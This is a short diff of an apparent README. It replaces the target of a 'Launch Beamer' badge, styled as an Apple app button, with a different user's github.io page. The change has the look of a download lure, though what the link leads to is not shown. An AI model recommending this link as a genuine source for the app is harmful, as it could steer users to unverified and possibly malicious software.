@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://manhyusuu48.github.io/.github/Beamer">  
+<a href="https://tembilamusion.github.io/.github/Beamer">  
 <img src="https://img.shields.io/badge/Launch_Beamer-FF6600?style=for-the-badge&logo=apple&logoColor=white" alt="Launch Beamer">  
 </a>  
 </div>  
